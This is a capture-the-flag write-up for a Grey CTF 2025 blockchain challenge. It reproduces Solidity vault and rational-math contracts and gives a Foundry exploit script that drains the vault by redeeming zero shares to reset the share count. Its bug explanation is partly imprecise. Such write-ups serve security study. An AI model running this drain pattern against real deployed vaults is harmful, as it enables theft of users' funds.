# 🚩 Rational – Medium

- **Category:** Blockchain
- **CTF Event:** Grey CTF 2025
- **Difficulty:** Medium

---

## Challenge Description

> We re-implemented ERC4626 to perform calculations in rational numbers. Rounding issues, begone!

---

## Challenge Files

- [`Vault.sol`](src/Vault.sol)
- [`Setup.sol`](src/Setup.sol)
- [`GREY.sol`](src/lib/GREY.sol)
- [`Rational.sol`](src/lib/Rational.sol)
- [`IERC20.sol`](src/lib/IERC20.sol)

Here only listed those files that will be used in the challenge as not every given files in the challenge are used. If you are interested to all the given files, you may check at here, [src/](src/).

---

## Objective

### `Setup.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GREY} from "./lib/GREY.sol";
import {RationalVault} from "./Vault.sol";

contract Setup {
    bool public claimed;

    // GREY token
    GREY public grey;

    // Challenge contracts
    RationalVault public vault;

    constructor() {
        // Deploy the GREY token contract
        grey = new GREY();

        // Deploy challenge contracts
        vault = new RationalVault(address(grey));

        // Mint 6000 GREY for setup
        grey.mint(address(this), 6000e18);

        // Deposit 5000 GREY into the vault
        grey.approve(address(vault), 5000e18);
        vault.deposit(5000e18);
    }

    // Note: Call this function to claim 1000 GREY for the challenge
    function claim() external {
        require(!claimed, "already claimed");
        claimed = true;

        grey.mint(msg.sender, 1000e18);
    }

    // Note: Challenge is solved when you have 6000 GREY
    function isSolved() external view returns (bool) {
        return grey.balanceOf(msg.sender) >= 6000e18;
    }
}
```

The main goal is to have 6000 ether of GREY token as required in the `isSolved()` function in the `Setup` contract.

---

## Code Analysis
  
### `GREY.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

/*
Note: This is a simple ERC20 contract with minting capabilities, there's no bug here.
*/
contract GREY {
    string constant public name     = "Grey Token";
    string constant public symbol   = "GREY";
    uint8  constant public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);

    address private immutable owner;

    uint256 public totalSupply;

    mapping(address => uint256) public balanceOf;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        owner = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        
        totalSupply += amount;
        balanceOf[to] += amount;

        emit Transfer(address(0), to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        
        emit Approval(msg.sender, spender, amount);

        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return transferFrom(msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;

        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        emit Transfer(from, to, amount);

        return true;
    }
}
```

This is a simple ERC20 token contract with minting capabilities. The contract allows the owner (the deployer) to mint new tokens, and implements standard ERC20 functions such as `transfer()`, `approve()`, and `transferFrom()`. The `mint()` function can only be called by the owner, ensuring that only the contract deployer can create new tokens. There are no vulnerabilities or unusual behaviors in this contract; it serves as the token used in the challenge.

---

### `IERC20.sol`

```solidity
// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)

pragma solidity >=0.8.0;

/**
 * @dev Interface of the ERC-20 standard as defined in the ERC.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the value of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the value of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves a `value` amount of tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 value) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the
     * caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 value) external returns (bool);

    /**
     * @dev Moves a `value` amount of tokens from `from` to `to` using the
     * allowance mechanism. `value` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
```

This is the standard ERC20 interface. It specifies the required functions and events for any ERC20-compliant token, such as `totalSupply()`, `balanceOf()`, `transfer()`, `approve()`, and `transferFrom()`. This interface is used to interact with ERC20 tokens in a generic way, ensuring compatibility with other contracts and tools that expect the ERC20 standard which will be used later on the `Vault` contract.

---

### `Rational.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Upper 128 bits is the numerator, lower 128 bits is the denominator
type Rational is uint256;

using {add as +, sub as -, mul as *, div as /, eq as ==, neq as !=} for Rational global;

// ======================================== CONVERSIONS ========================================

library RationalLib {
    Rational constant ZERO = Rational.wrap(0);

    function fromUint128(uint128 x) internal pure returns (Rational) {
        return toRational(x, 1);
    }

    function toUint128(Rational x) internal pure returns (uint128) {
        (uint256 numerator, uint256 denominator) = fromRational(x);
        return numerator == 0 ? 0 : uint128(numerator / denominator);
    }
}

// ======================================== OPERATIONS ========================================

function add(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (xNumerator == 0) return y;
    if (yNumerator == 0) return x;

    // (a / b) + (c / d) = (ad + cb) / bd
    uint256 numerator = xNumerator * yDenominator + yNumerator * xDenominator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}

function sub(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (yNumerator != 0) require(xNumerator != 0, "Underflow");

    // (a / b) - (c / d) = (ad - cb) / bd
    // a / b >= c / d implies ad >= cb, so the subtraction will never underflow when x >= y
    uint256 numerator = xNumerator * yDenominator - yNumerator * xDenominator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}

function mul(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (xNumerator == 0 || yNumerator == 0) return RationalLib.ZERO;

    // (a / b) * (c / d) = ac / bd
    uint256 numerator = xNumerator * yNumerator;
    uint256 denominator = xDenominator * yDenominator;

    return toRational(numerator, denominator);
}

function div(Rational x, Rational y) pure returns (Rational) {
    (uint256 xNumerator, uint256 xDenominator) = fromRational(x);
    (uint256 yNumerator, uint256 yDenominator) = fromRational(y);

    if (xNumerator == 0) return RationalLib.ZERO;
    require(yNumerator != 0, "Division by zero");

    // (a / b) / (c / d) = ad / bc
    uint256 numerator = xNumerator * yDenominator;
    uint256 denominator = xDenominator * yNumerator;

    return toRational(numerator, denominator);
}

function eq(Rational x, Rational y) pure returns (bool) {
    (uint256 xNumerator,) = fromRational(x);
    (uint256 yNumerator,) = fromRational(y);
    if (xNumerator == 0 && yNumerator == 0) return true;

    return Rational.unwrap(x) == Rational.unwrap(y);
}

function neq(Rational x, Rational y) pure returns (bool) {
    return !eq(x, y);
}

// ======================================== HELPERS ========================================

function fromRational(Rational v) pure returns (uint256 numerator, uint256 denominator) {
    numerator = Rational.unwrap(v) >> 128;
    denominator = Rational.unwrap(v) & type(uint128).max;
}

function toRational(uint256 numerator, uint256 denominator) pure returns (Rational) {
    if (numerator == 0) return RationalLib.ZERO;

    uint256 d = gcd(numerator, denominator);
    numerator /= d;
    denominator /= d;

    require(numerator <= type(uint128).max && denominator <= type(uint128).max, "Overflow");

    return Rational.wrap(numerator << 128 | denominator);
}

function gcd(uint256 x, uint256 y) pure returns (uint256) {
    while (y != 0) {
        uint256 t = y;
        y = x % y;
        x = t;
    }
    return x;
}
```

This file defines a custom value type `Rational` to represent rational numbers using a single uint256, where the upper 128 bits are the numerator and the lower 128 bits are the denominator. The file provides arithmetic operations (addition, subtraction, multiplication, division) and conversion functions for working with rational numbers. The RationalLib library includes helper functions for creating and converting rational numbers using `fromRational()` and `toRational()`, as well as reducing them to their simplest form by calculating the greatest common divisor (GCD) using `gcd()`. This allows precise fractional calculations within smart contracts. However, the logic design for those arithmetic operations were seems like reasonable and correct, but if you looking into it `add()` and `sub()`, you will find that it didn't put a checking if one of the input value is zero, which will cause the return value always to be `0` when one of the input value is `0`.

---

### `Vault.sol`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {IERC20} from "./lib/IERC20.sol";
import {Rational, RationalLib} from "./lib/Rational.sol";
import {console} from "forge-std/console.sol";

contract RationalVault {
    IERC20 public asset;

    mapping(address => Rational) internal sharesOf;
    Rational public totalShares;

    // ======================================== CONSTRUCTOR ========================================

    constructor(address _asset) {
        asset = IERC20(_asset);
    }

    // ======================================== MUTATIVE FUNCTIONS ========================================

    function deposit(uint128 amount) external {
        Rational _shares = convertToShares(amount);

        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;
        
        totalShares = totalShares + _shares;

        asset.transferFrom(msg.sender, address(this), amount);
    }

    // ***
    function mint(uint128 shares) external {
        Rational _shares = RationalLib.fromUint128(shares);
        uint256 amount = convertToAssets(_shares);

        sharesOf[msg.sender] = sharesOf[msg.sender] + _shares;
        totalShares = totalShares + _shares;

        asset.transferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint128 amount) external {
        Rational _shares = convertToShares(amount);

        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;
        totalShares = totalShares - _shares;

        asset.transfer(msg.sender, amount);
    }

    function redeem(uint128 shares) external {
        Rational _shares = RationalLib.fromUint128(shares);
        uint256 amount = convertToAssets(_shares);

        sharesOf[msg.sender] = sharesOf[msg.sender] - _shares;
        totalShares = totalShares - _shares;
        asset.transfer(msg.sender, amount);
    }

    // ======================================== VIEW FUNCTIONS ========================================

    function totalAssets() public view returns (uint128) {
        return uint128(asset.balanceOf(address(this)));
    }

    function convertToShares(uint128 assets) public view returns (Rational) {
        if (totalShares == RationalLib.ZERO)
            return RationalLib.fromUint128(assets);

        Rational _assets = RationalLib.fromUint128(assets);
        Rational _totalAssets = RationalLib.fromUint128(totalAssets());
        Rational _shares = (_assets / _totalAssets) * totalShares;

        return _shares;
    }

    function convertToAssets(Rational shares) public view returns (uint128) {
        if (totalShares == RationalLib.ZERO){
            return RationalLib.toUint128(shares);
        }

        Rational _totalAssets = RationalLib.fromUint128(totalAssets());
        Rational _assets = (shares / totalShares) * _totalAssets;
        return RationalLib.toUint128(_assets);
    }

    function totalSupply() external view returns (uint256) {
        return RationalLib.toUint128(totalShares);
    }

    function balanceOf(address account) external view returns (uint256) {
        return RationalLib.toUint128(sharesOf[account]);
    }
}
```

This contract implements a vault that allows users to deposit and withdraw ERC20 tokens (GREY) in exchange for shares, which represent their ownership in the vault. The vault uses the `Rational` type for precise share accounting. Users can deposit tokens to receive shares, withdraw tokens by burning shares, and convert between assets and shares using rational math. However, there is a critical vulnerability: if all shares are redeemed and totalShares becomes zero while the vault still holds assets, the next depositor can become the sole owner of all vault assets for a minimal deposit. This share accounting reset bug allows an attacker to drain the vault.

---

## Exploitation

The exploit takes advantage of a critical flaw in the vault’s share accounting logic and the arithmetic operation, `sub()` logic. By calling `redeem()` with `0` as the input value, we can reset `totalShares` to zero while the vault still holds all assets. Then, depositing just 1 GREY to let us to be the sole shareholder. When we redeem this share, we can receive the entire vault balance, draining all funds. This works because the vault does not properly handle the case where shares are reset but assets remain.

```solidity
function run() external returns (bool) {
    vm.startBroadcast();

    setup.claim();
    // // Approve the vault to spend your GREY
    grey.approve(address(vault), 1000e18);

    // Redeem 0 shares to make the totalShares to become 0
    vault.redeem(0);

    // Deposit 1 GREY to make the totalShares to become 1, and become the only shareholder
    vault.deposit(1);

    // Redeem 1 share to get all the GREY in the vault
    vault.redeem(1);
        
    console2.log("Our GREY balance:", grey.balanceOf(vm.envAddress("WALLET")));
    vm.stopBroadcast();
    return setup.isSolved();
}
```

See the full exploitation script [here](script/Exploit.s.sol). If you are interested with the test script as well, see the test script [here](test/Exploit.t.sol).

### Command to Deploy the Script and Test

For `Exploit.s.sol`:

```bash
forge script script/Exploit.s.sol:Exploit --broadcast --rpc-url $RPC_URL --private-key $PK
```

For `Exploit.t.sol`:

```bash
forge test --match-test testExploit
```

Please kindly save the variables in the `.env` file. However, and please don't save your private key in plaint text in production!

---